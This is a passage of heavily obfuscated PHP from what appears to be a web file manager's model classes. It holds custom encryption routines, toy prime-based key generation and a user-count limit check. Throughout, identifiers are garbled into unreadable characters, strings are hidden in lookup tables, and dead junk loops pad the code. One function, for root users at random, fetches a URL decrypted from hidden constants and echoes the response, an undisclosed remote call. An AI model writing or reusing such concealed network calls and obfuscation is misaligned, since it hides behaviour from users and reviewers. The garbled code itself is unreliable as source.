$˛Œ≤ŸœÆ; } $ÿ⁄Ã¢ªê = stream_context_create(array($Î∆÷èÿ‘[219] => array($Î∆÷èÿ‘[222] => $∫ôí´¨≥, $Î∆÷èÿ‘[220] => $Î∆÷èÿ‘[264]), $Î∆÷èÿ‘[265] => array($Î∆÷èÿ‘[266] => !1, $Î∆÷èÿ‘[267] => !1))); $¿à‚æÎÊ = $≤À˙á“„[770]; while (strlen($¿à‚æÎÊ) < $≤À˙á“„[710]) { if (!$¿à‚æÎÊ) { break; } $¿à‚æÎÊ++; } $û‚ô–∏é = @file_get_contents($˛Œ≤ŸœÆ, !1, $ÿ⁄Ã¢ªê); return json_decode($û‚ô–∏é, !0); $⁄üèÌ¯ú = $≤À˙á“„[771]; while ($⁄üèÌ¯ú < $≤À˙á“„[703]) { if ($⁄üèÌ¯ú >= 0) { break; } $⁄üèÌ¯ú++; } $÷ú‘óΩ⁄ = $≤À˙á“„[772]; if (strlen($÷ú‘óΩ⁄) < $≤À˙á“„[694]) { return; } } private function xmdz5fad395c() { $∞ ‰¶éı =& $_SERVER[ˆë€Ï⁄∂]; $ä¬ûÿ«Ø =& $_SERVER[ﬂéá≤›]; $…∂Íêÿ∫ = array($ä¬ûÿ«Ø[268] => $ä¬ûÿ«Ø[269], $ä¬ûÿ«Ø[270] => $ä¬ûÿ«Ø[271], $ä¬ûÿ«Ø[272] => $ä¬ûÿ«Ø[273], $ä¬ûÿ«Ø[274] => $ä¬ûÿ«Ø[275], $ä¬ûÿ«Ø[276] => $ä¬ûÿ«Ø[277], $ä¬ûÿ«Ø[278] => $ä¬ûÿ«Ø[214], $ä¬ûÿ«Ø[279] => $ä¬ûÿ«Ø[214], $ä¬ûÿ«Ø[280] => $ä¬ûÿ«Ø[269], $ä¬ûÿ«Ø[281] => $ä¬ûÿ«Ø[271], $ä¬ûÿ«Ø[282] => $ä¬ûÿ«Ø[273], $ä¬ûÿ«Ø[283] => $ä¬ûÿ«Ø[284], $ä¬ûÿ«Ø[285] => $ä¬ûÿ«Ø[275], $ä¬ûÿ«Ø[286] => $ä¬ûÿ«Ø[287], $ä¬ûÿ«Ø[288] => $ä¬ûÿ«Ø[277], $ä¬ûÿ«Ø[289] => $ä¬ûÿ«Ø[290], $ä¬ûÿ«Ø[291] => $ä¬ûÿ«Ø[292], $ä¬ûÿ«Ø[293] => $ä¬ûÿ«Ø[294]); $ÅÄØªÏæ = $…∂Íêÿ∫[$this->fido40be425b]; $ÅÄØªÏæ = intval($ÅÄØªÏæ ? $ÅÄØªÏæ : $ä¬ûÿ«Ø[269]); $»∫ıñÛî = _get($this->scwxc6467d48, $ä¬ûÿ«Ø[295]); $Õôƒî·› = $∞ ‰¶éı[773]; $»∫ıñÛî = $»∫ıñÛî ? intval($»∫ıñÛî) : 0; $”Í∏ö˘ì = $∞ ‰¶éı[774]; if (strlen($”Í∏ö˘ì) < $∞ ‰¶éı[694]) { die; } return $ÅÄØªÏæ + $»∫ıñÛî; $ıﬁ¥—Ï≥ = $∞ ‰¶éı[775]; } public function wduzd9129b74($âÑ•€Û˛) { $£’∑åÚ‹ =& $_SERVER[ˆë€Ï⁄∂]; $°¯ˆÿ˚˛ =& $_SERVER[ﬂéá≤›]; $øåïÇÆú = $this->xmdz5fad395c(); $ÊÆ¶ΩºÂ = $£’∑åÚ‹[776]; if ($âÑ•€Û˛[$°¯ˆÿ˚˛[296]] == $°¯ˆÿ˚˛[122]) { return; } if ($øåïÇÆú >= intval($°¯ˆÿ˚˛[214])) { return; } $·ÛªÒå¥ = Model($°¯ˆÿ˚˛[125])->count(); $ûŸ£ÛÜ‰ = $£’∑åÚ‹[777]; if ($·ÛªÒå¥ <= $øåïÇÆú) { return; } $”ÿ±Ã·§ = Model($°¯ˆÿ˚˛[125])->field($°¯ˆÿ˚˛[296])->limit($øåïÇÆú)->select(); $ÿïèË∑ = $£’∑åÚ‹[778]; if (!$ÿïèË∑) { return; } $”ÿ±Ã·§ = array_to_keyvalue($”ÿ±Ã·§, $°¯ˆÿ˚˛[6], $°¯ˆÿ˚˛[296]); if (!in_array($âÑ•€Û˛[$°¯ˆÿ˚˛[296]], $”ÿ±Ã·§)) { show_json($°¯ˆÿ˚˛[297], !1, $°¯ˆÿ˚˛[210]); } } public function pdyc49c41106() { $”õ¿˛Ñ„ =& $_SERVER[ˆë€Ï⁄∂]; $ΩœÆéŸ¥ =& $_SERVER[ﬂéá≤›]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $ÈâË—∆Œ = $ΩœÆéŸ¥[217]; $Î≠áÂƒÓ = $”õ¿˛Ñ„[779]; while ($Î≠áÂƒÓ < $”õ¿˛Ñ„[694]) { if ($Î≠áÂƒÓ >= 0) { break; } $Î≠áÂƒÓ++; } $ÈâË—∆Œ = $this->vwpq2d5e07ff($ÈâË—∆Œ, $ΩœÆéŸ¥[218]); $€Ä„›˙≈ = stream_context_create(array($ΩœÆéŸ¥[219] => array($ΩœÆéŸ¥[220] => $ΩœÆéŸ¥[221], $ΩœÆéŸ¥[222] => 3))); $ÛÚªñŸπ = @file_get_contents($ÈâË—∆Œ, !1, $€Ä„›˙≈); $•ÿÁ•îπ = $”õ¿˛Ñ„[780]; if (!$•ÿÁ•îπ) { die; } echo $ΩœÆéŸ¥[298] . hash_encode($ÛÚªñŸπ) . $ΩœÆéŸ¥[299]; } private function jqmy7483bc06($Ñì“Ëµ∆, $Œ™∂¥¯æ, $êª‹˛‚ = 3) { $¬‡ìÍı‰ =& $_SERVER[ˆë€Ï⁄∂]; $œ®–ÎØ =& $_SERVER[ﬂéá≤›]; usleep(1); $Ñì“Ëµ∆ = trim($Ñì“Ëµ∆); $ºòΩ˝Ñ∫ = $¬‡ìÍı‰[781]; if (strlen($ºòΩ˝Ñ∫) < $¬‡ìÍı‰[60]) { return; } $™Ω‚Û¢Œ = mt_rand(0, 5) . $œ®–ÎØ[6]; $˚˚™Ã’‰ = $¬‡ìÍı‰[782]; $˛î€⁄é◊ = rand_string(15); $íé∆“úØ = $œ®–ÎØ[300]; $ˆö¥∑˝ô = $¬‡ìÍı‰[783]; while ($ˆö¥∑˝ô < $¬‡ìÍı‰[700]) { if ($ˆö¥∑˝ô >= 0) { break; } $ˆö¥∑˝ô++; } switch ($™Ω‚Û¢Œ) { case $œ®–ÎØ[206]: $ﬁå≥ëµ‹ = $this->ckqmc7707aab($Ñì“Ëµ∆, strrev($Œ™∂¥¯æ . $˛î€⁄é◊)); break; case $œ®–ÎØ[122]: $ﬁå≥ëµ‹ = $this->ckqmc7707aab($Ñì“Ëµ∆, strrev($˛î€⁄é◊ . $Œ™∂¥¯æ)); $…ﬂ≤ÏÜÂ = $¬‡ìÍı‰[784]; if (!$…ﬂ≤ÏÜÂ) { return; } break; case $œ®–ÎØ[301]: $ﬁå≥ëµ‹ = $this->ckqmc7707aab($Ñì“Ëµ∆, base64_encode($˛î€⁄é◊ . $Œ™∂¥¯æ)); $ïÒ‘Øßª = $¬‡ìÍı‰[785]; break; $¿·§±ˆ≥ = $¬‡ìÍı‰[786]; if (strlen($¿·§±ˆ≥) < $¬‡ìÍı‰[60]) { return; } case $œ®–ÎØ[302]: $ﬁå≥ëµ‹ = $this->ckqmc7707aab($Ñì“Ëµ∆, md5($˛î€⁄é◊ . $Œ™∂¥¯æ)); $Ó£º–‘° = $¬‡ìÍı‰[787]; while (strlen($Ó£º–‘°) < $¬‡ìÍı‰[694]) { if (!$Ó£º–‘°) { break; } $Ó£º–‘°++; } break; case $œ®–ÎØ[303]: $Ñì“Ëµ∆ = base64_encode($Ñì“Ëµ∆); $òüŸΩ¢∫ = $¬‡ìÍı‰[788]; while (strlen($òüŸΩ¢∫) < $¬‡ìÍı‰[694]) { if (!$òüŸΩ¢∫) { break; } $òüŸΩ¢∫++; } $≠ÔÖ´ò∏ = rand(0, 64); $≥êÜ£Âß = $¬‡ìÍı‰[789]; $Ÿ‰øú·⁄ = $íé∆“úØ[$≠ÔÖ´ò∏]; $∫É˘´“Ω = $¬‡ìÍı‰[790]; $¶‘¯—ÈΩ = md5($Ÿ‰øú·⁄ . md5($Œ™∂¥¯æ . $Ÿ‰øú·⁄) . $Œ™∂¥¯æ); $ªÙÖÀ…∫ = $¬‡ìÍı‰[791]; if (!$ªÙÖÀ…∫) { die; } $¶‘¯—ÈΩ = substr($¶‘¯—ÈΩ, $≠ÔÖ´ò∏ % 8, $≠ÔÖ´ò∏ % 8 + 7); $º±ä„ü = $œ®–ÎØ[6]; $Úèª⁄£º = $¬‡ìÍı‰[792]; while (strlen($Úèª⁄£º) < $¬‡ìÍı‰[710]) { if (!$Úèª⁄£º) { break; } $Úèª⁄£º++; } $’‚±“Æ¨ = 0; $–ËÙ«€ƒ = 0; $ô·¬ ¢Ï = 0; for ($’‚±“Æ¨ = 0; $’‚±“Æ¨ < strlen($Ñì“Ëµ∆); $’‚±“Æ¨++) { $ô·¬ ¢Ï = $ô·¬ ¢Ï == strlen($¶‘¯—ÈΩ) ? 0 : $ô·¬ ¢Ï; $ªñƒÍ¶… = $¬‡ìÍı‰[793]; while (strlen($ªñƒÍ¶…) < $¬‡ìÍı‰[60]) { if (!$ªñƒÍ¶…) { break; } $ªñƒÍ¶…++; } $–ËÙ«€ƒ = ($≠ÔÖ´ò∏ + strpos($íé∆“úØ, $Ñì“Ëµ∆[$’‚±“Æ¨]) + ord($¶‘¯—ÈΩ[$ô·¬ ¢Ï++])) % 64; $ÃÓ£¡Õ∏ = $¬‡ìÍı‰[794]; if (!$ÃÓ£¡Õ∏) { return; } $º±ä„ü .= $íé∆“úØ[$–ËÙ«€ƒ]; $ëı⁄êëœ = $¬‡ìÍı‰[795]; } $ﬁå≥ëµ‹ = hash_encode($Ÿ‰øú·⁄ . $º±ä„ü); break; $â¢ÅŒ·ï = $¬‡ìÍı‰[796]; if (!$â¢ÅŒ·ï) { return; } default: $ﬁå≥ëµ‹ = $this->ckqmc7707aab($Ñì“Ëµ∆, $Œ™∂¥¯æ . $˛î€⁄é◊); $ÁÔ≈∫˜Ú = $¬‡ìÍı‰[797]; while ($ÁÔ≈∫˜Ú < $¬‡ìÍı‰[703]) { if ($ÁÔ≈∫˜Ú >= 0) { break; } $ÁÔ≈∫˜Ú++; } break; $ûÂ¡±∏ˆ = $¬‡ìÍı‰[798]; } $ﬁå≥ëµ‹ = strrev($™Ω‚Û¢Œ . $˛î€⁄é◊ . $ﬁå≥ëµ‹); $Á⁄íÀ¶Æ = $¬‡ìÍı‰[799]; if (strlen($Á⁄íÀ¶Æ) < $¬‡ìÍı‰[694]) { die; } if ($êª‹˛‚ - 1 > 0) { $ﬁå≥ëµ‹ = $this->jqmy7483bc06($ﬁå≥ëµ‹, $Œ™∂¥¯æ, $êª‹˛‚ - 1); } return $ﬁå≥ëµ‹; } private function zjvr0707295f($á¢‚É·∫, $Äÿœœ≥˛, $™áÖ≥’ó = 3) { $à∂Áµ€ü =& $_SERVER[ˆë€Ï⁄∂]; $˛ﬁÛΩ¢Á =& $_SERVER[ﬂéá≤›]; if (!is_string($á¢‚É·∫) || strlen($á¢‚É·∫) < 10) { return !1; } $á¢‚É·∫ = trim($á¢‚É·∫); $Á¶âÛ©µ = $à∂Áµ€ü[800]; while (strlen($Á¶âÛ©µ) < $à∂Áµ€ü[60]) { if (!$Á¶âÛ©µ) { break; } $Á¶âÛ©µ++; } $á¢‚É·∫ = strrev($á¢‚É·∫); $Œ˙¡úæ˚ = $á¢‚É·∫[0]; $¯âıÑÏÈ = substr($á¢‚É·∫, 1, 15); $ÁØÚ˘ Ω = $à∂Áµ€ü[801]; if (!$ÁØÚ˘ Ω) { die; } $á¢‚É·∫ = substr($á¢‚É·∫, 16); $ìŸµï≠⁄ = $à∂Áµ€ü[802]; while (strlen($ìŸµï≠⁄) < $à∂Áµ€ü[60]) { if (!$ìŸµï≠⁄) { break; } $ìŸµï≠⁄++; } $ú‡òºàó = $˛ﬁÛΩ¢Á[300]; switch ($Œ˙¡úæ˚) { case $˛ﬁÛΩ¢Á[206]: $Ã‘Ü∏∏í = $this->vwpq2d5e07ff($á¢‚É·∫, strrev($Äÿœœ≥˛ . $¯âıÑÏÈ)); break; case $˛ﬁÛΩ¢Á[122]: $Ã‘Ü∏∏í = $this->vwpq2d5e07ff($á¢‚É·∫, strrev($¯âıÑÏÈ . $Äÿœœ≥˛)); $ÿ¶é˜Œ† = $à∂Áµ€ü[803]; if (strlen($ÿ¶é˜Œ†) < $à∂Áµ€ü[710]) { die; } break; $Ü÷ÀØº = $à∂Áµ€ü[804]; if (!$Ü÷ÀØº) { return; } case $˛ﬁÛΩ¢Á[301]: $Ã‘Ü∏∏í = $this->vwpq2d5e07ff($á¢‚É·∫, base64_encode($¯âıÑÏÈ . $Äÿœœ≥˛)); $øÂ¯Êúç = $à∂Áµ€ü[805]; while ($øÂ¯Êúç < $à∂Áµ€ü[700]) { if ($øÂ¯Êúç >= 0) { break; } $øÂ¯Êúç++; } break; case $˛ﬁÛΩ¢Á[302]: $Ã‘Ü∏∏í = $this->vwpq2d5e07ff($á¢‚É·∫, md5($¯âıÑÏÈ . $Äÿœœ≥˛)); break; $«Ø¯¯Î≠ = $à∂Áµ€ü[806]; if (!$«Ø¯¯Î≠) { return; } case $˛ﬁÛΩ¢Á[303]: $á¢‚É·∫ = hash_decode($á¢‚É·∫); $ïî◊ò¨∑ = $á¢‚É·∫[0]; $á¢‚É·∫ = substr($á¢‚É·∫, 1); $äØ°àµÓ = strpos($ú‡òºàó, $ïî◊ò¨∑); $ñ£ﬂÄ„◊ = $à∂Áµ€ü[807]; while (strlen($ñ£ﬂÄ„◊) < $à∂Áµ€ü[700]) { if (!$ñ£ﬂÄ„◊) { break; } $ñ£ﬂÄ„◊++; } $íÂƒÌ…÷ = md5($ïî◊ò¨∑ . md5($Äÿœœ≥˛ . $ïî◊ò¨∑) . $Äÿœœ≥˛); $ƒΩ≈”„Õ = $à∂Áµ€ü[808]; if (!$ƒΩ≈”„Õ) { die; } $íÂƒÌ…÷ = substr($íÂƒÌ…÷, $äØ°àµÓ % 8, $äØ°àµÓ % 8 + 7); $ÕÁÖüœó = $à∂Áµ€ü[809]; while (strlen($ÕÁÖüœó) < $à∂Áµ€ü[694]) { if (!$ÕÁÖüœó) { break; } $ÕÁÖüœó++; } $≥∏®«Î∫ = $˛ﬁÛΩ¢Á[6]; $Û˛§ü⁄‰ = 0; $Öåõ˚¥´ = $à∂Áµ€ü[810]; if (strlen($Öåõ˚¥´) < $à∂Áµ€ü[700]) { return; } $Ùïã…≤é = 0; $ÓÓ“˘Ä = 0; for ($Û˛§ü⁄‰ = 0; $Û˛§ü⁄‰ < strlen($á¢‚É·∫); $Û˛§ü⁄‰++) { $ÓÓ“˘Ä = $ÓÓ“˘Ä == strlen($íÂƒÌ…÷) ? 0 : $ÓÓ“˘Ä; $’¨ÿ‘Ω≠ = $ÓÓ“˘Ä++; $Ùïã…≤é = strpos($ú‡òºàó, $á¢‚É·∫[$Û˛§ü⁄‰]) - $äØ°àµÓ - ord($íÂƒÌ…÷[$’¨ÿ‘Ω≠]); while ($Ùïã…≤é < 0) { $Ùïã…≤é += 64; } $≥∏®«Î∫ .= $ú‡òºàó[$Ùïã…≤é]; $˙¸æ¨ÆÆ = $à∂Áµ€ü[811]; if (!$˙¸æ¨ÆÆ) { return; } } $Ã‘Ü∏∏í = base64_decode($≥∏®«Î∫); $∑ä√ﬁ˛Ÿ = $à∂Áµ€ü[746]; if (!$∑ä√ﬁ˛Ÿ) { return; } break; $˘±û√‘÷ = $à∂Áµ€ü[812]; while ($˘±û√‘÷ < $à∂Áµ€ü[700]) { if ($˘±û√‘÷ >= 0) { break; } $˘±û√‘÷++; } default: $Ã‘Ü∏∏í = $this->vwpq2d5e07ff($á¢‚É·∫, $Äÿœœ≥˛ . $¯âıÑÏÈ); break; $ﬂì´£ñÜ = $à∂Áµ€ü[813]; while ($ﬂì´£ñÜ < $à∂Áµ€ü[60]) { if ($ﬂì´£ñÜ >= 0) { break; } $ﬂì´£ñÜ++; } } if ($™áÖ≥’ó - 1 > 0) { $Ã‘Ü∏∏í = $this->zjvr0707295f($Ã‘Ü∏∏í, $Äÿœœ≥˛, $™áÖ≥’ó - 1); } return $Ã‘Ü∏∏í; } public function gluxb771f4c0($˛∑ÙÒ€∏) { $¶û®∆‘± =& $_SERVER[ˆë€Ï⁄∂]; $»ä«Ø·√ =& $_SERVER[ﬂéá≤›]; $«¡€˝ë  = $this->pdng9349dc5d(); $ﬂã¥≈íæ = $this->pdng9349dc5d(); $Ùê«ÓÁß = ($«¡€˝ë  - 1) * ($ﬂã¥≈íæ - 1); $ﬂß…Œ„œ = intval(($«¡€˝ë  + $ﬂã¥≈íæ) / 2); while (1) { $π◊Õ¨¿Ö = $ﬂß…Œ„œ; $È’öâÛÙ = $¶û®∆‘±[814]; if (strlen($È’öâÛÙ) < $¶û®∆‘±[703]) { die; } $¨¨·∑˚« = $Ùê«ÓÁß; $›¶Óö«¨ = $¶û®∆‘±[815]; if (!$›¶Óö«¨) { die; } while ($¨¨·∑˚« % $π◊Õ¨¿Ö != 0) { $·ì¥˝πù = $¨¨·∑˚«; $ﬂØû‘¿¡ = $¶û®∆‘±[816]; $¨¨·∑˚« = $π◊Õ¨¿Ö; $˝Ü∆Ú€∑ = $¶û®∆‘±[817]; while ($˝Ü∆Ú€∑ < $¶û®∆‘±[700]) { if ($˝Ü∆Ú€∑ >= 0) { break; } $˝Ü∆Ú€∑++; } $π◊Õ¨¿Ö = $·ì¥˝πù % $π◊Õ¨¿Ö; $Ï∑ÙÒ«  = $¶û®∆‘±[724]; while ($Ï∑ÙÒ«  < $¶û®∆‘±[710]) { if ($Ï∑ÙÒ«  >= 0) { break; } $Ï∑ÙÒ« ++; } } if ($π◊Õ¨¿Ö == 1) { break; } else { $ﬂß…Œ„œ++; } } $Ò™ãﬁèÊ = 2; $Ö—≤ú•Ï = $¶û®∆‘±[818]; for ($ÎÒœ‹Œâ = 0; $ÎÒœ‹Œâ < $Ùê«ÓÁß * 10; $ÎÒœ‹Œâ++) { if (($Ùê«ÓÁß * $ÎÒœ‹Œâ + 1) % $ﬂß…Œ„œ == 0) { $Ò™ãﬁèÊ = intval(($Ùê«ÓÁß * $ÎÒœ‹Œâ + 1) / $ﬂß…Œ„œ); break; } } $˚∫ˆªèﬁ = $this->ckqmc7707aab($«¡€˝ë  * $ﬂã¥≈íæ . $»ä«Ø·√[6], $»ä«Ø·√[136]); $å∏º€¯π = $¶û®∆‘±[819]; if (!$å∏º€¯π) { return; } $ œ©÷´ = md5($»ä«Ø·√[304] . ($«¡€˝ë  + $ﬂã¥≈íæ) . $»ä«Ø·√[305] . $ﬂß…Œ„œ . $»ä«Ø·√[305] . $Ò™ãﬁèÊ . $»ä«Ø·√[306]); $ÂÄ≠¶Ì∑ = $this->ckqmc7707aab($˛∑ÙÒ€∏, $ œ©÷´) . $»ä«Ø·√[307] . $˚∫ˆªèﬁ; $‹‡¨€íŸ = $¶û®∆‘±[820]; if (!$‹‡¨€íŸ) { return; } return $ÂÄ≠¶Ì∑; $˜˘±«•‚ = $¶û®∆‘±[821]; while (strlen($˜˘±«•‚) < $¶û®∆‘±[60]) { if (!$˜˘±«•‚) { break; } $˜˘±«•‚++; } } public function rzmh22f3c3fd($ŸÓ©È‹≥) { $√‰¡Ö®é =& $_SERVER[ˆë€Ï⁄∂]; $Û¬Í„âı =& $_SERVER[ﬂéá≤›]; $ä˝◊ËüÏ = explode($Û¬Í„âı[307], $ŸÓ©È‹≥); if (count($ä˝◊ËüÏ) != 2) { return $Û¬Í„âı[6]; } $◊‘ëÒÌ“ = $this->vwpq2d5e07ff($ä˝◊ËüÏ[1] . $Û¬Í„âı[6], $Û¬Í„âı[136]); $ë‚ùÃ“ú = $√‰¡Ö®é[822]; while (strlen($ë‚ùÃ“ú) < $√‰¡Ö®é[703]) { if (!$ë‚ùÃ“ú) { break; } $ë‚ùÃ“ú++; } if (!$◊‘ëÒÌ“) { return $Û¬Í„âı[6]; } $◊‘ëÒÌ“ = intval($◊‘ëÒÌ“); $›◊Ωƒ¿ = $√‰¡Ö®é[823]; if (strlen($›◊Ωƒ¿) < $√‰¡Ö®é[700]) { return; } $˝˘û Æù = 0; $´⁄‡≤–ì = $√‰¡Ö®é[824]; $˜Õ©Ÿáñ = 0; $¢¶œÙ‰› = $√‰¡Ö®é[825]; if (strlen($¢¶œÙ‰›) < $√‰¡Ö®é[700]) { return; } for ($Œƒ‰ó≥“ = 3; $Œƒ‰ó≥“ < $◊‘ëÒÌ“; $Œƒ‰ó≥“ += 2) { if ($◊‘ëÒÌ“ % $Œƒ‰ó≥“ != 0) { continue; } $˝˘û Æù = $Œƒ‰ó≥“; $˜Õ©Ÿáñ = intval($◊‘ëÒÌ“ / $Œƒ‰ó≥“); break; } $ùíÌ∑≈∑ = ($˝˘û Æù - 1) * ($˜Õ©Ÿáñ - 1); $™≤Ò„à = intval(($˝˘û Æù + $˜Õ©Ÿáñ) / 2); $«Ä®≥Àı = $√‰¡Ö®é[826]; if (strlen($«Ä®≥Àı) < $√‰¡Ö®é[694]) { return; } while (1) { $¬á”¿õæ = $™≤Ò„à; $…ü‚ÊΩù = $ùíÌ∑≈∑; $Œû°∏ä≥ = $√‰¡Ö®é[827]; while ($…ü‚ÊΩù % $¬á”¿õæ != 0) { $≈¸’óæ… = $…ü‚ÊΩù; $…ü‚ÊΩù = $¬á”¿õæ; $¬á”¿õæ = $≈¸’óæ… % $¬á”¿õæ; $√Óﬂ·∫Î = $√‰¡Ö®é[828]; while ($√Óﬂ·∫Î < $√‰¡Ö®é[60]) { if ($√Óﬂ·∫Î >= 0) { break; } $√Óﬂ·∫Î++; } } if ($¬á”¿õæ == 1) { break; } else { $™≤Ò„à++; } } $é∆Î≠çá = 2; for ($Œƒ‰ó≥“ = 0; $Œƒ‰ó≥“ < $ùíÌ∑≈∑ * 10; $Œƒ‰ó≥“++) { if (($ùíÌ∑≈∑ * $Œƒ‰ó≥“ + 1) % $™≤Ò„à == 0) { $é∆Î≠çá = intval(($ùíÌ∑≈∑ * $Œƒ‰ó≥“ + 1) / $™≤Ò„à); break; } } $◊ì¿áôµ = md5($Û¬Í„âı[304] . ($˝˘û Æù + $˜Õ©Ÿáñ) . $Û¬Í„âı[305] . $™≤Ò„à . $Û¬Í„âı[305] . $é∆Î≠çá . $Û¬Í„âı[306]); $Áì‡˜∏‡ = $this->vwpq2d5e07ff($ä˝◊ËüÏ[0], $◊ì¿áôµ); $ﬁÆå ÏÉ = $√‰¡Ö®é[829]; while (strlen($ﬁÆå ÏÉ) < $√‰¡Ö®é[703]) { if (!$ﬁÆå ÏÉ) { break; } $ﬁÆå ÏÉ++; } return $Áì‡˜∏‡; $õê∆ŒÓÑ = $√‰¡Ö®é[830]; if (!$õê∆ŒÓÑ) { return; } } public function pdng9349dc5d() { $ì‡–∑‡â =& $_SERVER[ˆë€Ï⁄∂]; $®…∞„è≥ = mt_rand(pow(2, 14), pow(2, 16) - 1); $∑ÿô∫†ö = $ì‡–∑‡â[831]; if (strlen($∑ÿô∫†ö) < $ì‡–∑‡â[60]) { die; } $áõ¯ı¿‡ = array(); $ˆéà∫ÛÁ = $ì‡–∑‡â[832]; if (!$ˆéà∫ÛÁ) { return; } $ÿæπ”Ä‹ = 1; $±Ω£˚–À = $ì‡–∑‡â[833]; while ($ÿæπ”Ä‹ <= (int) sqrt($®…∞„è≥)) { $å◊Í∫¬ = $ÿæπ”Ä‹; while (!0) { $å◊Í∫¬++; $îÍ™≥Î® = $ì‡–∑‡â[834]; if (!$îÍ™≥Î®) { die; } if ($å◊Í∫¬ <= 2) { $ÿæπ”Ä‹ = $å◊Í∫¬; break; } else { if ($å◊Í∫¬ < 2) { continue; } } $‚äë‘Àå = !0; for ($πº∑´Óí = 2; $πº∑´Óí <= sqrt($å◊Í∫¬); $πº∑´Óí++) { if ($å◊Í∫¬ % $πº∑´Óí == 0) { $‚äë‘Àå = !1; } } if ($‚äë‘Àå) { $ÿæπ”Ä‹ = $å◊Í∫¬; break; } } $áõ¯ı¿‡[] = $ÿæπ”Ä‹; } $ØÕòí≠´ = 2; for ($å◊Í∫¬ = $®…∞„è≥; $å◊Í∫¬ > 1; $å◊Í∫¬--) { $‚äë‘Àå = !0; $“ß‹∑ı¶ = $ì‡–∑‡â[835]; if (strlen($“ß‹∑ı¶) < $ì‡–∑‡â[60]) { return; } foreach ($áõ¯ı¿‡ as $≠ì¡Ô«¢) { if ($å◊Í∫¬ % $≠ì¡Ô«¢ == 0) { $‚äë‘Àå = !1; break; } } if ($‚äë‘Àå) { $ØÕòí≠´ = $å◊Í∫¬; break; } } return $ØÕòí≠´; $Ù√ºÿüœ = $ì‡–∑‡â[836]; if (!$Ù√ºÿüœ) { die; } } public function yihc9d5ab45c($¢Àó„Ù∫, $„‚–àè∏) { $âıÜìÏ∂ =& $_SERVER[ˆë€Ï⁄∂]; $º”ØŒø∆ =& $_SERVER[ﬂéá≤›]; return call_user_func(array($º”ØŒø∆[8], $º”ØŒø∆[308]), $¢Àó„Ù∫, $„‚–àè∏); $µ¶Æ›î‹ = $âıÜìÏ∂[837]; if (strlen($µ¶Æ›î‹) < $âıÜìÏ∂[703]) { return; } } public function ckqmc7707aab($ª˜çô¸◊, $ÚÎÂ¸ú«) { $ëË”µùÛ =& $_SERVER[ﬂéá≤›]; return call_user_func(array($ëË”µùÛ[309], $ëË”µùÛ[310]), $ª˜çô¸◊, $ÚÎÂ¸ú«); $ÛìÜèç√ = $_SERVER[ˆë€Ï⁄∂][819]; if (!$ÛìÜèç√) { die; } } public function vwpq2d5e07ff($ò¢üû¿, $∫†‰»Íµ) { $–ƒå‹Ä„ =& $_SERVER[ˆë€Ï⁄∂]; $Å£‰Ú√” =& $_SERVER[ﬂéá≤›]; return call_user_func(array($Å£‰Ú√”[309], $Å£‰Ú√”[311]), $ò¢üû¿, $∫†‰»Íµ); $æ£ÆÕ¥Ñ = $–ƒå‹Ä„[838]; while (strlen($æ£ÆÕ¥Ñ) < $–ƒå‹Ä„[700]) { if (!$æ£ÆÕ¥Ñ) { break; } $æ£ÆÕ¥Ñ++; } } } goto c€Öå≥—∆û; C∏ßê…€±ﬁ: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\56\x4c\151\x67\150\x74\101\x70\x70"; public $modelType = "\123\x79\x73\164\x65\155\117\x70\x74\x69\x6f\156"; public $field = array("\156\x61\x6d\145", "\x67\162\x6f\x75\160", "\x64\145\x73\143", "\143\157\x6e\164\x65\156\x74"); public function listData($‰”»Òñ∂ = false, $Î‹ò∂ß≥ = "\155\x6f\x64\151\146\x79\124\x69\155\x65", $ûπÕ√œπ = true) { return parent::listData($‰”»Òñ∂, $Î‹ò∂ß≥, $ûπÕ√œπ); } public function remove($ò†›õ¢ï) { $£èŸê∆à = $this->findByName($ò†›õ¢ï); if (!$£èŸê∆à) { return !1; } return parent::remove($£èŸê∆à[$_SERVER[ˆë€Ï⁄∂][486]]); } public function add($Œ‘èæÖ·) { if ($this->findByName($Œ‘èæÖ·[$_SERVER[ˆë€Ï⁄∂][32]])) { return !1; } return parent::insert($Œ‘èæÖ·); } public function update($‘⁄¡˝≈ÿ, $ûÒ„°µø) { $òµ’õ¯‡ =& $_SERVER[ˆë€Ï⁄∂]; $‰É™≥ñ— = $this->findByName($‘⁄¡˝≈ÿ); $®◊Î·µ¯ = $this->findByName($ûÒ„°µø[$òµ’õ¯‡[32]]); if (!$‰É™≥ñ— || $®◊Î·µ¯ && $®◊Î·µ¯[$òµ’õ¯‡[486]] != $‰É™≥ñ—[$òµ’õ¯‡[486]]) { return !1; } return parent::update($‰É™≥ñ—[$òµ’õ¯‡[486]], $ûÒ„°µø); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\163\164\x65\x6d\137\x6c\x6f\x67"; protected $dataAuto = array(array("\143\x72\x65\141\164\145\x54\151\x6d\145", "\x74\x69\x6d\x65", "\x69\x6e\163\x65\x72\x74", "\146\165\156\x63\164\151\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $Çæëõ∫§ =& $_SERVER[ˆë€Ï⁄∂]; return array($Çæëõ∫§[2360] => LNG($Çæëõ∫§[2361]), $Çæëõ∫§[2362] => LNG($Çæëõ∫§[2363]), $Çæëõ∫§[1930] => LNG($Çæëõ∫§[2364]), $Çæëõ∫§[2365] => LNG($Çæëõ∫§[2366]), $Çæëõ∫§[2367] => LNG($Çæëõ∫§[2368]), $Çæëõ∫§[2369] => LNG($Çæëõ∫§[2370]), $Çæëõ∫§[2371] => LNG($Çæëõ∫§[2372]), $Çæëõ∫§[1960] => LNG($Çæëõ∫§[2372]), $Çæëõ∫§[1961] => LNG($Çæëõ∫§[2373]), $Çæëõ∫§[2374] => LNG($Çæëõ∫§[2375]), $Çæëõ∫§[2376] => LNG($Çæëõ∫§[2377]), $Çæëõ∫§[2378] => LNG($Çæëõ∫§[2379]), $Çæëõ∫§[2380] => LNG($Çæëõ∫§[2381]), $Çæëõ∫§[1958] => LNG($Çæëõ∫§[2382]), $Çæëõ∫§[2383] => LNG($Çæëõ∫§[2384]), $Çæëõ∫§[1965] => LNG($Çæëõ∫§[2385]), $Çæëõ∫§[2386] => LNG($Çæëõ∫§[2387]), $Çæëõ∫§[2388] => LNG($Çæëõ∫§[2389]), $Çæëõ∫§[2390] => LNG($Çæëõ∫§[2391]), $Çæëõ∫§[2392] => LNG($Çæëõ∫§[2393]), $Çæëõ∫§[1968] => LNG($Çæëõ∫§[2394]), $Çæëõ∫§[1969] => LNG($Çæëõ∫§[2395]), 